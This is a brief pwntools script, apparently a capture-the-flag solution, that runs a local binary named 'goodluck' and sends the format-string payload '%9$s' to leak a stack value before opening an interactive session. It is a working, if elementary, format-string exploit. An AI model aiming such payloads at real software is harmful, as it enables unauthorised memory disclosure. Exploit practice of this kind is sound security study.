from pwn import *

context.log_level = 'debug'


sh = process('./goodluck')
payload = "%9$s"
print(payload)
#gdb.attach(sh)
sh.sendline(payload)
print(sh.recv())
sh.interactive()
